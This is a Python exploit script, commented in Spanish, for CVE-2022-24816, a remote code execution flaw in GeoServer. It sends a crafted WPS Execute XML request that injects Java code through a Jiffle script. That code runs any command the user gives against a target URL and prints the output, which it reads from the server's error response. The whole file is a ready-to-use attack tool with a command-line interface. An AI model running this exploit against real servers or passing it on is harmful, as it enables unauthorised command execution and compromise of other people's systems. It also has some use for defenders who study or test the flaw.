import re
import requests
import argparse
import urllib3
from colorama import init, Fore, Style

# Colores usando colorama
init(autoreset=True)
VERDE = Fore.GREEN
CIAN = Fore.CYAN
AZUL = Fore.BLUE
ROJO = Fore.RED
RESET = Style.RESET_ALL

# Deshabilitar advertencias de seguridad por desactivación de la verificación SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Mostrar el banner
def mostrar_banner():
    print(f"{VERDE}#########################################################{RESET}")
    print(f"{CIAN}#                                                       #{RESET}")
    print(f"{VERDE}#            ████▓▒░  CVE-2022-24816  ░▒▓████           #{RESET}")
    print(f"{CIAN}#                                                       #{RESET}")
    print(f"{VERDE}#########################################################{RESET}")
    print(f"{AZUL}#              ▓▒░ Creado por: C1ph3rByt3               #{RESET}")
    print(f"{VERDE}#########################################################{RESET}")
    print()

def extraer_salida_comando(respuesta_xml):
    """
    Extrae y limpia la salida del comando ejecutado de la respuesta XML.

    :param respuesta_xml: La respuesta XML del servidor.
    :return: La salida del comando limpia o None si no se encuentra.
    """
    # Usar una expresión regular para encontrar el contenido dentro de <ows:ExceptionText>
    coincidencia = re.search(r"<ows:ExceptionText>.*?ExceptionInInitializerError - (.*?)</ows:ExceptionText>", respuesta_xml, re.DOTALL)
    if coincidencia:
        # Extraer la salida del comando
        salida_comando = coincidencia.group(1).strip()
        return salida_comando
    return None

def explotar_geoserver(url, comando):
    """
    Explota la vulnerabilidad RCE de GeoServer (CVE-2022-24816) enviando una solicitud maliciosa de WPS Execute.

    :param url: La URL objetivo de GeoServer (por ejemplo, "http://ejemplo.com" o "https://ejemplo.com").
    :param comando: El comando que se ejecutará en el sistema objetivo.
    :return: None
    """
    url_objetivo = f"{url.rstrip('/')}/geoserver/wms"

    # Payload malicioso
    payload = (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<wps:Execute version=\"1.0.0\" service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
        "xmlns=\"http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" "
        "xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\" "
        "xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\" "
        "xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" "
        "xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\">"
        "<ows:Identifier>ras:Jiffle</ows:Identifier>"
        "<wps:DataInputs>"
        "<wps:Input>"
        "<ows:Identifier>coverage</ows:Identifier>"
        "<wps:Data>"
        "<wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>"
        "</wps:Data>"
        "</wps:Input>"
        "<wps:Input>"
        "<ows:Identifier>script</ows:Identifier>"
        "<wps:Data>"
        f"<wps:LiteralData>dest = y() - (500); // */ public class Double {{ public static double NaN = 0; static {{ try {{ java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"{comando}\").getInputStream())); String line = null; String allLines = \" - \"; while ((line = reader.readLine()) != null) {{ allLines += line; }} throw new RuntimeException(allLines);}} catch (java.io.IOException e) {{}} }} }} /**</wps:LiteralData>"
        "</wps:Data>"
        "</wps:Input>"
        "<wps:Input>"
        "<ows:Identifier>outputType</ows:Identifier>"
        "<wps:Data>"
        "<wps:LiteralData>DOUBLE</wps:LiteralData>"
        "</wps:Data>"
        "</wps:Input>"
        "</wps:DataInputs>"
        "<wps:ResponseForm>"
        "<wps:RawDataOutput mimeType=\"image/tiff\">"
        "<ows:Identifier>result</ows:Identifier>"
        "</wps:RawDataOutput>"
        "</wps:ResponseForm>"
        "</wps:Execute>"
    )

    headers = {
        "Host": url.split('://')[1].split('/')[0],
        "Content-Type": "application/xml",
    }

    try:
        response = requests.post(url_objetivo, headers=headers, data=payload, timeout=10, verify=False)
        if response.status_code == 200:
            salida_comando = extraer_salida_comando(response.text)
            if salida_comando:
                print(f"{VERDE}[+] Comando ejecutado con éxito:{RESET}")
                print(f"{CIAN}{salida_comando}{RESET}")
            else:
                print(f"{ROJO}[-] No se encontró la salida del comando en la respuesta.{RESET}")
        else:
            print(f"{ROJO}[-] Código de estado inesperado recibido: {response.status_code}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{ROJO}[!] Error: {e}{RESET}")

if __name__ == "__main__":
    mostrar_banner()
    parser = argparse.ArgumentParser(description="Explotar vulnerabilidad RCE en GeoServer (CVE-2022-24816)")
    parser.add_argument("-u", "--url", required=True, help="URL objetivo de GeoServer (por ejemplo, http://ejemplo.com o https://ejemplo.com)")
    parser.add_argument("-c", "--command", required=True, help="Comando a ejecutar en el sistema objetivo")
    args = parser.parse_args()

    explotar_geoserver(args.url, args.command)
